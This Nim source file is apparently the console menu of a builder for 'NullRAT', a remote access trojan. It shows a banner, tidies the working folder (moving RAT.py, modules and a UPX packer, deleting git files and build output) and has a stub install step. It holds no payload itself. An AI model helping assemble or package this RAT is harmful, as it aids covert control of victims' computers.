import std/terminal
import std/os

proc cls() = 
    discard execShellCmd("cls")

discard execShellCmd("chcp 65001");
cls()
discard execShellCmd("mode con: cols=80 lines=29");

proc cleanWorkingDir() =
    echo ""
    var dirrr = getAppDir();
    setCurrentDir(getAppDir());
    echo getCurrentDir();
    if dirExists(absolutePath("NullRAT")):
        createDir("NullRAT2")
        moveFile(absolutePath("NullRAT" / "custom_icon.ico"), dirrr / "NullRAT2" / "custom_icon.ico")
        moveFile(absolutePath("NullRAT" / "RAT.py"), dirrr / "NullRAT2"    / "RAT.py")
        moveDir(absolutePath("NullRAT" / "modules"), dirrr / "NullRAT2" / "modules")
        moveDir(absolutePath("NullRAT" / "upx"), dirrr / "NullRAT2" / "upx")
        # check existing variables
        if fileExists(absolutePath("NullRAT" / "Variables.py")):
            var inp: char
            while inp != 'Y' or inp != 'y' or inp != 'N' or inp != 'n':
                echo "Existing Variables file found! Preserve? (y/N)"
                inp = getch()
                if inp == 'Y' or inp == 'y':
                    moveFile(absolutePath("NullRAT" / "Variables.py"), dirrr / "NullRAT2" / "Variables.py")
                    break
                else:
                    break
        removeDir("NullRAT")
        moveDir(dirrr / "NullRAT2", dirrr / "NullRAT")
    removeFile("AIO.bat")
    removeFile("AIO_Legacy.bat")
        
    # remove git stuff if downloaded from source
    var inpu: char
    while inpu != 'Y' or inpu != 'y' or inpu != 'N' or inpu != 'n':
        echo "Remove git files? (y/N)"
        inpu = getch()
        if inpu == 'y' or inpu == 'Y':
            removeDir(".git")
            removeFile("README.md")
            removeFile("Getting Variables.md")
            removeFile(".gitignore")
            break
        else:
            break
    removeFile("RAT.exe")
    removeDir("build")
    removeDir("dist")        
    
    cls()
    
proc printName() = 
    echo ""
    stdout.styledWriteLine(fgRed, "  ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗  █████╗ ████████╗")
    stdout.styledWriteLine(fgRed, "  ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔══██╗╚══██╔══╝")
    stdout.styledWriteLine(fgRed, "  ██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝███████║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗██╔══██║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║██║  ██║   ██║")
    stdout.styledWriteLine(fgRed, "  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝")
    stdout.styledWriteLine(fgRed, "  =========================================================")
    echo ""

proc packageInstaller() = 
    echo "packageinstaller"
    
proc mainMenu() =
    printName();
    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
    echo ""
    stdout.styledWriteLine({styleBright}, " Press any key to continue, E to exit and C to clear working directory...")
    var input: char = getch();
    if input == 'E' or input == 'e':
        quit(0)
    elif input == 'C' or input == 'c':
        cleanWorkingDir()
    else:
        packageInstaller()
        
while true:
    mainMenu();
#stdout.styledWriteLine(fgRed, "")